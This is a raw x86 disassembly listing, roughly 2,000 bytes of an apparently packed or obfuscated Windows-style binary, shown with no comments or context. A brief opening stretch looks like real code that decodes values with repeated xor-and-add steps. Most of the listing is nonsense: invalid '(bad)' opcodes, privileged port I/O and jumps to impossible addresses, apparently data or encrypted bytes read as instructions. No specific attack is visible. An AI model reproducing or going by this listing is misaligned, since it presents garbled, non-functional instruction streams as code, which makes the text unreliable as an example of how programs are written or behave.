  4081cc:	lock dec esp
  4081ce:	adc    edi,edx
  4081d0:	xchg   ebx,eax
  4081d1:	ins    BYTE PTR es:[edi],dx
  4081d2:	aam    0x1c
  4081d4:	lea    eax,[ebp+0x4]
  4081d7:	mov    DWORD PTR [ebp-0x20],eax
  4081da:	je     0x40966c
  4081e0:	lea    eax,[ebp-0x18]
  4081e3:	push   eax
  4081e4:	mov    eax,DWORD PTR [ebp-0x2c]
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408269:	xchg   esi,eax
  40826a:	cli    
  40826b:	nop
  40826c:	aaa    
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x4082f2
  408275:	xor    BYTE PTR [esi],al
  408277:	jl     0x408261
  408279:	sbb    dh,dh
  40827b:	pop    esp
  40827c:	jb     0x40825f
  40827e:	push   0xffffffe0
  408280:	int3   
  408281:	popf   
  408282:	adc    DWORD PTR [edi+0x63],edx
  408285:	jo     0x4082ab
  408287:	mov    ds:0x59f158a9,al
  40828c:	jb     0x408286
  40828e:	xor    al,BYTE PTR [edi]
  408290:	mov    al,0xf9
  408292:	dec    ebx
  408293:	(bad)  
  408294:	push   ebp
  408295:	retf   
  408296:	mov    dh,0x87
  408298:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408299:	dec    esi
  40829a:	mov    dl,dl
  40829c:	pop    es
  40829d:	or     BYTE PTR [esp+esi*1+0x36],bl
  4082a1:	xor    BYTE PTR [ecx-0x514a699b],dl
  4082a7:	pop    es
  4082a8:	je     0x408296
  4082aa:	stos   BYTE PTR es:[edi],al
  4082ab:	cdq    
  4082ac:	in     al,dx
  4082ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082ae:	and    eax,0xe561715f
  4082b3:	dec    esi
  4082b4:	lods   eax,DWORD PTR ds:[esi]
  4082b5:	pop    eax
  4082b6:	pop    ecx
  4082b7:	ror    BYTE PTR [edx-0x43],1
  4082ba:	sbb    bh,ch
  4082bc:	jno    0x408335
  4082be:	sbb    BYTE PTR [eax],ah
  4082c0:	inc    ebp
  4082c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082c2:	mov    ecx,0x4a210e8b
  4082c7:	xchg   esp,eax
  4082c8:	imul   eax,DWORD PTR [edx+0x4ab6f1dd],0xaabea947
  4082d2:	mov    bl,0xfa
  4082d4:	mov    edx,0x8a4c0f8a
  4082d9:	pop    ecx
  4082da:	inc    eax
  4082db:	push   ss
  4082dc:	(bad)  
  4082dd:	ins    DWORD PTR es:[edi],dx
  4082de:	push   esi
  4082df:	ja     0x408351
  4082e1:	nop
  4082e2:	test   al,0x55
  4082e4:	imul   ebx,DWORD PTR [ebx-0x7a],0xf56d1ed3
  4082eb:	in     eax,0x7b
  4082ed:	pop    ecx
  4082ee:	xchg   esp,eax
  4082ef:	mov    edi,0x3634ca64
  4082f4:	arpl   WORD PTR [edx-0x7660df29],cx
  4082fa:	addr16 aaa 
  4082fc:	imul   edx,DWORD PTR [ebx],0xb79b97dd
  408302:	push   esp
  408303:	repz pop ss
  408305:	loop   0x40830e
  408307:	sub    eax,0x6a5813b5
  40830c:	pop    esp
  40830d:	or     BYTE PTR [eax],0xa5
  408310:	cmp    eax,0x5c04f780
  408315:	push   ecx
  408316:	inc    esp
  408317:	retf   0x82b8
  40831a:	ret    0xd9
  40831d:	ds push esi
  40831f:	out    dx,eax
  408320:	out    0x4a,eax
  408322:	aas    
  408323:	inc    esp
  408324:	aaa    
  408325:	gs into 
  408327:	adc    edi,DWORD PTR [esi+0x70]
  40832a:	enter  0x260f,0x47
  40832e:	jmp    FWORD PTR [ebx]
  408330:	jecxz  0x408348
  408332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408333:	aad    0xba
  408335:	push   esi
  408336:	fst    DWORD PTR [edi-0x567a91d]
  40833c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40833d:	xor    ebx,DWORD PTR [ebp+0x32]
  408340:	fs dec edx
  408342:	fisubr DWORD PTR [eax]
  408344:	iret   
  408345:	test   al,0xed
  408347:	pushf  
  408348:	push   ebx
  408349:	pop    ds
  40834a:	ja     0x5b237f3
  408350:	sub    eax,0x78a37e7e
  408355:	iret   
  408356:	jne    0x4082e6
  408358:	cli    
  408359:	xchg   edx,eax
  40835a:	loopne 0x408393
  40835c:	ror    BYTE PTR [ebp+edx*8+0x34],0x63
  408361:	mov    ebx,edx
  408363:	mov    dh,0x5
  408365:	cmp    DWORD PTR [edi-0x28c9335e],ecx
  40836b:	aaa    
  40836c:	mov    eax,ds:0xfd84050d
  408371:	sbb    BYTE PTR [esp+ecx*2],ah
  408374:	adc    eax,0xe9d8aba3
  408379:	ins    BYTE PTR es:[edi],dx
  40837a:	mov    al,0xd1
  40837c:	stos   BYTE PTR es:[edi],al
  40837d:	inc    ebp
  40837e:	push   edi
  40837f:	icebp  
  408380:	adc    bh,BYTE PTR [esi+0x12]
  408383:	xchg   ebp,eax
  408384:	xor    al,0xda
  408386:	outs   dx,BYTE PTR ds:[esi]
  408387:	inc    esp
  408388:	aam    0xcc
  40838a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40838b:	jbe    0x4083d9
  40838d:	mov    ch,0x7a
  40838f:	fwait
  408390:	cmp    DWORD PTR [ebp-0x228f04ab],ebx
  408396:	loop   0x408352
  408398:	add    BYTE PTR [edi+0x5a687e6b],ch
  40839e:	adc    eax,0xac0d934e
  4083a3:	xor    esi,DWORD PTR [edx+0x3]
  4083a6:	xor    eax,0x1e096e22
  4083ab:	(bad)  
  4083ac:	retf   0x3e3a
  4083af:	int    0x9
  4083b1:	adc    ah,BYTE PTR [eax-0x677a6600]
  4083b7:	mov    ds:0x4bfb35f,eax
  4083bc:	mov    al,ds:0xc09c505
  4083c1:	add    cl,BYTE PTR [edx]
  4083c3:	mov    bh,0xb5
  4083c5:	gs imul esp,eax,0xffffffeb
  4083c9:	retf   0x241e
  4083cc:	adc    DWORD PTR [edi],ecx
  4083ce:	mov    BYTE PTR ds:0x594ab50,bh
  4083d4:	cmp    al,0xc
  4083d7:	pop    eax
  4083d8:	stos   BYTE PTR es:[edi],al
  4083d9:	xchg   edi,eax
  4083db:	or     al,0x33
  4083dd:	pop    esi
  4083de:	dec    edi
  4083df:	cwde   
  4083e0:	jge    0x408452
  4083e2:	mov    dl,0x37
  4083e4:	and    DWORD PTR [ebp+ebp*8-0x4b],esp
  4083e8:	xchg   esp,eax
  4083e9:	jns    0x4083d6
  4083eb:	push   ebx
  4083ec:	aaa    
  4083ed:	mov    esp,0x3f6322ba
  4083f2:	xchg   esp,eax
  4083f3:	xor    DWORD PTR [ebx-0x1],0x9e668dd9
  4083fa:	mov    ecx,0xb5a48141
  4083ff:	push   edi
  408400:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408401:	xor    DWORD PTR [eax],0x79b4489c
  408407:	inc    eax
  408408:	mov    edi,0x984075ea
  40840d:	jl     0x4083eb
  40840f:	(bad)  
  408410:	repz std 
  408412:	shr    BYTE PTR [edx+0x3d03bd40],cl
  408418:	in     eax,dx
  408419:	jmp    0x442cae9
  40841e:	pop    ss
  40841f:	sbb    BYTE PTR [edi-0x4f],dh
  408422:	shl    cl,0xea
  408425:	xchg   DWORD PTR [esi+0xc],edx
  408428:	push   ss
  408429:	rol    DWORD PTR [eax],0x70
  40842c:	dec    esi
  40842d:	repnz int 0xd2
  408430:	sub    al,0x40
  408432:	xchg   edi,eax
  408433:	pushf  
  408434:	push   ss
  408435:	push   cs
  408436:	jns    0x4083f7
  408438:	and    dh,dh
  40843a:	lds    ebp,FWORD PTR [ebp+0x4d310024]
  408440:	test   DWORD PTR [esi-0x16],esp
  408443:	push   DWORD PTR [esi-0x272ab26]
  408449:	mov    ebp,edi
  40844b:	sbb    al,0x8d
  40844d:	call   0xbadb49a
  408452:	leave  
  408453:	jg     0x40841d
  408455:	and    cl,ah
  408457:	mov    bh,0xd6
  408459:	or     edx,DWORD PTR [edi+0x28]
  40845c:	mov    dh,BYTE PTR [esi-0x15]
  40845f:	mov    DWORD PTR [esi-0x5b],esi
  408462:	fidivr WORD PTR [di+0x1c]
  408466:	mov    ds:0xeef66731,eax
  40846b:	jnp    0x4084bc
  40846d:	in     eax,dx
  40846e:	mov    ss,WORD PTR ds:0xeae3e6e8
  408474:	std    
  408475:	lods   al,BYTE PTR ds:[esi]
  408476:	shr    DWORD PTR [edx],1
  408478:	mov    BYTE PTR [ebp-0xb],ah
  40847b:	add    DWORD PTR [edx-0x3a4017da],ecx
  408481:	mov    ?,WORD PTR [eax-0x694e7987]
  408487:	inc    ebp
  408488:	push   edi
  408489:	test   BYTE PTR [edi-0x5f86444a],bh
  40848f:	and    DWORD PTR [edi+0x4a],edi
  408492:	mov    esp,0xa7ccf8af
  408497:	aas    
  408498:	es test eax,0xdd11ef85
  40849e:	inc    esi
  40849f:	jbe    0x4084f1
  4084a1:	and    eax,DWORD PTR [eax-0x1e]
  4084a4:	inc    edx
  4084a5:	mov    ds:0x3f308d5d,al
  4084aa:	jo     0x4084cd
  4084ac:	jp     0x408526
  4084ae:	dec    edi
  4084af:	push   eax
  4084b0:	and    al,0xad
  4084b2:	out    0x3e,al
  4084b4:	mov    dl,0x94
  4084b6:	js     0x408486
  4084b8:	cdq    
  4084b9:	rcr    BYTE PTR [edi+0x1f659342],0x81
  4084c0:	xor    al,0x5a
  4084c2:	adc    ebx,eax
  4084c4:	std    
  4084c5:	pusha  
  4084c6:	popa   
  4084c7:	retf   0x7e27
  4084ca:	xchg   ebp,eax
  4084cb:	jp     0x4084cb
  4084cd:	inc    edx
  4084ce:	mov    bl,BYTE PTR [edi-0x6ed512c7]
  4084d4:	or     eax,0x6fa7190e
  4084d9:	dec    esp
  4084da:	inc    ebp
  4084db:	xlat   BYTE PTR ds:[ebx]
  4084dc:	sbb    dh,bh
  4084de:	sbb    DWORD PTR [ebx+0x12d02824],ebp
  4084e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084e5:	repnz arpl WORD PTR [esi+0x53],dx
  4084e9:	stos   DWORD PTR es:[edi],eax
  4084ea:	arpl   si,bp
  4084ec:	imul   edi,DWORD PTR [esi],0x74bdb3ac
  4084f2:	mov    WORD PTR [ebx+ecx*2-0x5b],es
  4084f6:	jnp    0x408524
  4084f8:	cs cld 
  4084fa:	or     DWORD PTR [ecx-0x14],edi
  4084fd:	push   esp
  4084fe:	push   edx
  4084ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408500:	leave  
  408501:	into   
  408502:	mov    ecx,0xc8f4ad9f
  408507:	adc    edi,edx
  408509:	leave  
  40850a:	fmul   QWORD PTR [edx]
  40850c:	inc    esi
  40850d:	popa   
  40850e:	jb     0x4084f8
  408510:	repz bound eax,QWORD PTR [edi-0x54]
  408514:	sub    eax,0x67d21137
  408519:	(bad)  
  40851a:	xchg   ecx,eax
  40851b:	loope  0x4084fa
  40851d:	imul   ecx,ebp,0xfffffff4
  408520:	enter  0xc787,0x0
  408524:	daa    
  408525:	add    eax,0x3bb09945
  40852a:	and    eax,eax
  40852c:	fld    QWORD PTR [ecx+0x12b05f7]
  408532:	stc    
  408533:	ffree  st(0)
  408535:	jb     0x40852f
  408537:	aad    0x1e
  408539:	push   eax
  40853a:	shr    BYTE PTR [ecx+eiz*4],1
  40853d:	lods   al,BYTE PTR ds:[esi]
  40853e:	fstp   QWORD PTR [esi]
  408540:	sub    BYTE PTR [eax+0x20],cl
  408543:	fcmovne st,st(0)
  408545:	sub    ecx,DWORD PTR [esi]
  408547:	imul   ebp,DWORD PTR [edx],0x882268ae
  40854d:	mov    WORD PTR [esi],es
  40854f:	fcmovbe st,st(1)
  408551:	jns    0x408592
  408553:	inc    ebx
  408554:	jnp    0x408515
  408556:	ins    DWORD PTR es:[edi],dx
  408557:	leave  
  408558:	scas   al,BYTE PTR es:[edi]
  408559:	sbb    eax,0xcd6e9b76
  40855e:	cmp    eax,0x4569b9c3
  408563:	lds    ecx,FWORD PTR [edi+0x11]
  408566:	add    BYTE PTR [edi],0x5f
  408569:	outs   dx,BYTE PTR ds:[esi]
  40856a:	and    eax,0x8bf989e3
  40856f:	dec    edi
  408570:	jmp    0x4085c8
  408572:	pusha  
  408573:	push   esi
  408574:	popa   
  408575:	out    0x1a,al
  408577:	sbb    BYTE PTR [esi],bh
  408579:	mov    dh,0x7b
  40857b:	adc    eax,0x7b283c13
  408580:	clc    
  408581:	and    ebx,DWORD PTR [ecx]
  408583:	leave  
  408584:	mov    al,ds:0x88f5571
  408589:	repnz sahf 
  40858b:	mov    ebx,0x73ce361e
  408590:	and    cl,dh
  408592:	cmp    DWORD PTR [esp-0x8eddaf7],esp
  408599:	call   0xb77a6180
  40859e:	imul   eax,DWORD PTR [ebp+0x72],0x9
  4085a2:	fistp  WORD PTR [esi]
  4085a4:	mov    BYTE PTR [ecx],al
  4085a6:	jmp    0x4088f3
  4085ab:	inc    edi
  4085ac:	cli    
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0x9a4e08f4
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x408545
  4085c4:	icebp  
  4085c5:	jge    0x40858f
  4085c7:	ds pop ds
  4085c9:	scas   al,BYTE PTR es:[edi]
  4085ca:	push   edx
  4085cb:	ds cld 
  4085cd:	loop   0x4085f4
  4085cf:	fist   WORD PTR [edx]
  4085d1:	js     0x408581
  4085d3:	test   BYTE PTR [esi],bl
  4085d5:	cmp    BYTE PTR [ebp+0x3ff042ba],al
  4085db:	jno    0x4085be
  4085dd:	imul   esp,DWORD PTR [edi+0x2eec7374],0x610e9832
  4085e7:	sbb    BYTE PTR [edi-0x7ffe4d7d],ah
  4085ed:	pop    esp
  4085ee:	push   esp
  4085f0:	adc    dh,BYTE PTR [ebx+eiz*2]
  4085f3:	mov    esi,edi
  4085f5:	xchg   ebp,eax
  4085f6:	jmp    0x2a91bc0a
  4085fb:	stos   BYTE PTR es:[edi],al
  4085fc:	shr    BYTE PTR ds:0x16c42d45,1
  408602:	mov    cl,0xf7
  408604:	mov    WORD PTR [ebx-0x2e],fs
  408607:	mov    WORD PTR [edi-0x46],?
  40860a:	fs inc ebp
  40860c:	arpl   WORD PTR [edi-0x5443d135],sp
  408612:	int    0x55
  408614:	(bad)  
  408615:	(bad)  
  408616:	into   
  408617:	xchg   ecx,eax
  408618:	push   edx
  408619:	pop    ss
  40861a:	pop    eax
  40861b:	mov    ebx,0x21967018
  408620:	dec    BYTE PTR [ebp-0x46]
  408623:	pop    ebx
  408624:	(bad)
  408627:	pop    esp
  408628:	xchg   ebp,eax
  408629:	dec    ebp
  40862a:	inc    ecx
  40862b:	adc    al,0x77
  40862d:	fs jbe 0x408644
  408630:	inc    edx
  408631:	(bad)  
  408632:	dec    eax
  408633:	std    
  408634:	aas    
  408635:	adc    DWORD PTR [ebp-0x80],eax
  408638:	mov    BYTE PTR ds:0x6340dc81,dh
  40863e:	bound  edi,QWORD PTR [esi+ecx*2]
  408641:	ss jecxz 0x4085db
  408644:	mov    al,0x71
  408646:	fmul   DWORD PTR [eax-0x3db9412c]
  40864c:	mov    ah,0xf6
  40864e:	xor    bl,BYTE PTR [edx+0x6a]
  408651:	or     edx,DWORD PTR [esi+0x510df598]
  408657:	ret    
  408658:	imul   DWORD PTR [ebx-0x38]
  40865b:	je     0x4086b3
  40865d:	or     ecx,DWORD PTR [ebp+0x71]
  408660:	bound  edx,QWORD PTR [edi+0x2edb4161]
  408666:	adc    al,0x87
  408668:	js     0x40869a
  40866a:	neg    DWORD PTR [edi]
  40866c:	sar    BYTE PTR [esi+0x779c365c],1
  408672:	sbb    bl,0xff
  408675:	adc    eax,0xa99d9935
  40867a:	stos   BYTE PTR es:[edi],al
  40867b:	(bad)  
  40867c:	mov    eax,ds:0x202af875
  408681:	add    ebp,DWORD PTR [ecx-0x7547c016]
  408687:	jg     0x408682
  408689:	ja     0x40863e
  40868b:	jae    0x408644
  40868d:	into   
  40868e:	test   DWORD PTR [bx+0x67],0x1b4e44a5
  408696:	fnsave [edx-0x45]
  408699:	int3   
  40869a:	shl    BYTE PTR [edi+edx*8-0x80],1
  40869e:	cmp    eax,0x4bb7ab48
  4086a3:	sbb    BYTE PTR [eax+0x2e],dh
  4086a6:	shl    esi,0xae
  4086a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086aa:	adc    ebx,esi
  4086ac:	sub    ecx,DWORD PTR [edi+0x1f7ebcdb]
  4086b2:	inc    edi
  4086b3:	test   eax,0xfe59d345
  4086b8:	out    0xfc,eax
  4086ba:	and    esi,ecx
  4086bc:	cmp    al,0x81
  4086be:	jns    0x4086f3
  4086c0:	test   al,0xf
  4086c2:	pusha  
  4086c3:	lea    ecx,[edi+ebx*4]
  4086c6:	(bad)  
  4086c8:	jle    0x408651
  4086ca:	rcl    DWORD PTR [ecx],0x27
  4086cd:	rol    BYTE PTR [esi+0x766c5295],1
  4086d3:	out    0x69,al
  4086d5:	fwait
  4086d6:	adc    bh,bl
  4086d8:	pop    edx
  4086d9:	out    0xde,al
  4086db:	outs   dx,DWORD PTR ds:[esi]
  4086dc:	push   ecx
  4086dd:	int    0x83
  4086df:	xchg   esp,eax
  4086e0:	mov    edx,DWORD PTR [esi-0x7]
  4086e3:	ret    
  4086e4:	cs pop ecx
  4086e6:	jge    0x408669
  4086e8:	adc    ch,BYTE PTR [eax]
  4086ea:	(bad)  
  4086eb:	and    BYTE PTR [edi],ah
  4086ed:	int    0x7c
  4086ef:	pop    ecx
  4086f0:	int    0x46
  4086f2:	jg     0x40876c
  4086f4:	lods   eax,DWORD PTR ds:[esi]
  4086f5:	ficomp WORD PTR [ebx+0x30]
  4086f8:	aas    
  4086f9:	sub    edx,esp
  4086fb:	aam    0xda
  4086fd:	lods   eax,DWORD PTR ds:[esi]
  4086fe:	into   
  4086ff:	repz or eax,0x8af98c73
  408705:	es add edx,ecx
  408708:	mov    ecx,0xd8bc3d7c
  40870d:	mov    DWORD PTR [esi+0x62e76f20],edi
  408713:	(bad)  
  408714:	push   edi
  408715:	fs push es
  408717:	sbb    eax,DWORD PTR [ebp+0x46370872]
  40871d:	aaa    
  40871e:	push   0x16
  408720:	push   ss
  408721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408722:	lds    ebp,FWORD PTR [edx-0x2]
  408725:	test   esi,edi
  408727:	and    DWORD PTR [ecx+0x3b],edi
  40872a:	hlt    
  40872b:	out    0x31,eax
  40872d:	test   bh,dh
  40872f:	loop   0x4087a1
  408731:	push   0x38
  408733:	or     DWORD PTR [ecx+esi*2-0x50],0xdff4b336
  40873b:	sbb    eax,0x88171065
  408740:	xchg   ebx,eax
  408741:	add    BYTE PTR [ecx-0x47],ah
  408744:	pusha  
  408745:	pop    edi
  408746:	pop    ebp
  408747:	adc    al,al
  408749:	mov    ebp,0xd5a21442
  40874e:	retf   0x151a
  408751:	loop   0x4086fc
  408753:	and    DWORD PTR [eax+0xe],edx
  408756:	mov    dh,0xf
  408758:	xchg   DWORD PTR [edx-0x3c8be594],esi
  40875e:	xchg   edi,eax
  40875f:	int    0x29
  408761:	mov    edx,0xead1c041
  408766:	fldenv [eax+0x30]
  408769:	(bad)  
  40876a:	sub    bl,BYTE PTR [eax+eiz*2]
  40876d:	aad    0xaa
  40876f:	dec    ebx
  408770:	outs   dx,BYTE PTR ds:[esi]
  408771:	mov    esp,0x9f0a8dee
  408776:	lods   al,BYTE PTR ds:[esi]
  408777:	popf   
  408778:	shl    DWORD PTR [ebx],0xf1
  40877b:	sbb    edx,ecx
  40877d:	jge    0x408718
  40877f:	ret    0xc1d8
  408782:	pop    es
  408783:	test   eax,edi
  408785:	sbb    BYTE PTR [edi-0x4b],ch
  408788:	aas    
  408789:	xchg   ebx,eax
  40878a:	sub    DWORD PTR [eax-0x4731793f],0x9fe3a16f
  408794:	jge    0x40877f
  408796:	xchg   ecx,eax
  408797:	aaa    
  408798:	pop    esi
  408799:	add    DWORD PTR [ecx+0x7ec66a67],ebx
  40879f:	(bad)  
  4087a0:	dec    ebp
  4087a2:	cdq    
  4087a3:	push   0x3f
  4087a5:	cmp    eax,0x46affd57
  4087aa:	sub    dh,BYTE PTR [esi]
  4087ac:	inc    ecx
  4087ad:	(bad)
  4087b1:	icebp  
  4087b2:	adc    ch,BYTE PTR ss:[esi*2+0x51444e7c]
  4087ba:	enter  0xb27c,0xfc
  4087be:	(bad)  [eax]
  4087c0:	jbe    0x408800
  4087c2:	sbb    al,0xae
  4087c4:	rcl    BYTE PTR [edi],1
  4087c6:	sub    al,0x4
  4087c8:	inc    eax
  4087c9:	loop   0x408826
  4087cb:	sbb    edi,DWORD PTR [ecx+0x379a38c7]
  4087d1:	gs mov al,0x5a
  4087d4:	mov    ds:0x4e2a7452,eax
  4087d9:	sub    DWORD PTR [ebx+ebp*4-0x14],ebp
  4087dd:	out    0xe2,eax
  4087df:	xor    al,0x6b
  4087e1:	inc    esi
  4087e2:	inc    ebx
  4087e3:	shl    DWORD PTR [edx+0x63d54032],cl
  4087e9:	icebp  
  4087ea:	repnz sar DWORD PTR [eax+esi*4+0x13dca0fd],cl
  4087f2:	xchg   edi,eax
  4087f3:	pop    ebx
  4087f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087f5:	mov    eax,ds:0x700a731f
  4087fa:	ficom  WORD PTR [esi+eax*4]
  4087fd:	pop    ds
  4087fe:	cmc    
  4087ff:	daa    
  408800:	pop    ds
  408801:	sti    
  408802:	sti    
  408803:	jecxz  0x408807
  408805:	lahf   
  408806:	xchg   BYTE PTR [ecx],dl
  408808:	jno    0x408882
  40880a:	inc    ecx
  40880b:	imul   DWORD PTR [esi+ebx*4+0x3c83cf9f]
  408812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408813:	retf   0x3f8f
  408816:	(bad)  
  408817:	or     al,0xf0
  408819:	bound  edx,QWORD PTR [ecx]
  40881b:	jo     0x40888d
  40881d:	xchg   BYTE PTR [esi],cl
  40881f:	test   BYTE PTR [ebp-0x60],0x9d
  408823:	push   edi
  408824:	or     cl,BYTE PTR [eax]
  408826:	add    al,0x5
  408828:	and    BYTE PTR [ebp-0x3208dfc1],ah
  40882e:	test   al,0x47
  408830:	leave  
  408831:	mov    esi,ds
  408833:	jo     0x408894
  408835:	ins    DWORD PTR es:[edi],dx
  408836:	repnz (bad) 
  408838:	sbb    al,0x58
  40883a:	aad    0x1b
  40883c:	dec    esp
  40883d:	repnz cld 
  40883f:	aaa    
  408840:	push   eax
  408841:	repnz (bad) 
  408844:	push   cs
  408845:	mov    dh,0x95
  408847:	inc    ebx
  408848:	cmp    ebp,eax
  40884a:	icebp  
  40884b:	ss mov dh,0x6b
  40884e:	sub    eax,0xfec8f85b
  408853:	and    DWORD PTR [edi],ecx
  408855:	inc    edi
  408856:	jecxz  0x4088b4
  408858:	push   ss
  408859:	(bad)
  40885c:	inc    edx
  40885d:	sbb    DWORD PTR [ecx+edi*8+0x48dbd9c4],edi
  408864:	nop
  408865:	not    DWORD PTR [esi-0x29d82edc]
  40886b:	pop    edx
  40886c:	ret    
  40886d:	cmp    edx,DWORD PTR [edx]
  40886f:	scas   eax,DWORD PTR es:[edi]
  408870:	pop    edx
  408871:	and    eax,0x605ea309
  408876:	jecxz  0x408870
  408878:	pop    edi
  408879:	sar    DWORD PTR [eax-0x5cc58fb8],cl
  40887f:	imul   ebx,DWORD PTR [ebx+0x79],0x4e3513ae
  408886:	mov    ecx,0xa2860011
  40888b:	ret    
  40888c:	xor    BYTE PTR [ebp+0x7e],0xcc
  408890:	push   ebx
  408891:	inc    esi
  408892:	adc    bh,BYTE PTR [edx]
  408894:	mov    edi,0xd11b6ddd
  408899:	xchg   DWORD PTR [edi+0x48],edi
  40889c:	daa    
  40889d:	lods   eax,DWORD PTR ss:[esi]
  40889f:	or     eax,0xd625a9b8
  4088a4:	fwait
  4088a5:	mov    esp,0xef6a54c2
  4088aa:	jns    0x4088b2
  4088ac:	(bad)
  4088af:	or     DWORD PTR [eax-0x9baaaa6],ebp
  4088b5:	inc    ebp
  4088b6:	icebp  
  4088b7:	repz jl 0x40892d
  4088ba:	mov    ch,BYTE PTR [esi]
  4088bc:	dec    ecx
  4088bd:	sbb    al,0xd2
  4088bf:	dec    esi
  4088c0:	int    0x92
  4088c2:	(bad)  [ebx]
  4088c4:	cmc    
  4088c5:	stc    
  4088c6:	sub    ebp,ebx
  4088c8:	pop    ecx
  4088c9:	(bad)  
  4088ca:	setno  BYTE PTR ds:0xd6efbc71
  4088d1:	inc    ecx
  4088d2:	add    al,BYTE PTR [eax+ecx*1]
  4088d5:	repz addr16 push ebx
  4088d8:	pop    edi
  4088d9:	lea    edx,[ebx+0x3de9cb55]
  4088df:	mov    edx,esp
  4088e1:	ins    DWORD PTR es:[edi],dx
  4088e2:	xor    al,0xc0
  4088e4:	pop    esi
  4088e5:	sub    edx,DWORD PTR [ebx]
  4088e7:	mov    edx,0x729226d8
  4088ec:	sbb    esi,DWORD PTR [edx]
  4088ee:	ret    
  4088ef:	cmp    al,0xe
  4088f1:	jbe    0x408912
  4088f3:	lea    eax,[ebp-0x8]
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp+0x6b435cff],cl
  40890c:	je     0x4088fe
  40890e:	stos   DWORD PTR es:[edi],eax
  40890f:	xchg   edi,eax
  408910:	fdiv   QWORD PTR [eax+0x70]
  408913:	and    BYTE PTR [ebp+0x70],bh
  408916:	jo     0x408975
  408918:	dec    edi
  408919:	or     ah,ch
  40891b:	pop    ecx
  40891c:	and    eax,DWORD PTR [ebp+0x74]
  40891f:	xchg   esi,eax
  408920:	adc    BYTE PTR [edi-0x1b],0x44
  408924:	jle    0x40895f
  408926:	jle    0x4088bb
  408928:	xchg   DWORD PTR [esi+0x2b],esi
  40892b:	mov    edx,0x83d30486
  408930:	js     0x408932
  408932:	dec    edx
  408933:	mov    ch,0x79
  408935:	clc    
  408936:	push   ecx
  408937:	adc    eax,edi
  408939:	mov    BYTE PTR [edi-0x53],bl
  40893c:	jmp    0xcefd3d80
  408941:	mov    edi,0x92b5715b
  408946:	add    al,0x3b
  408948:	test   BYTE PTR [ebp+0x17],bh
  40894b:	jae    0x408990
  40894d:	push   edx
  40894e:	xor    eax,0x5c19d51a
  408953:	(bad)  
  408954:	mov    ds:0x81ca132a,al
  408959:	jne    0x40896d
  40895b:	push   eax
  40895c:	not    DWORD PTR ds:0x57121da
  408962:	or     al,BYTE PTR [edx+0xd7f9ddb]
  408968:	into   
  408969:	sbb    al,BYTE PTR [edi+eiz*2-0x70]
  40896d:	mov    DWORD PTR [eax],edi
  40896f:	jb     0x4089d4
  408971:	xchg   ebx,eax
  408972:	dec    esi
  408973:	and    al,0xd6
  408975:	les    esp,FWORD PTR [ebx+0x30]
  408978:	dec    ecx
  408979:	inc    eax
  40897a:	and    DWORD PTR [esi],0xf4f4608e
  408980:	pop    esi
  408981:	(bad)  
  408982:	pop    ecx
  408983:	inc    edx
  408984:	lods   al,BYTE PTR ds:[esi]
  408985:	sbb    ebx,DWORD PTR [ecx+ecx*4-0x61f80ada]
  40898c:	or     esi,DWORD PTR [eax-0x36]
  40898f:	add    eax,0xb4a14335
  408994:	in     al,0xca
  408996:	frstor ds:0xb4e086ee
  40899c:	call   0x793428b4
  4089a1:	mov    DWORD PTR [eax-0xc25391],esi
  4089a7:	push   esi
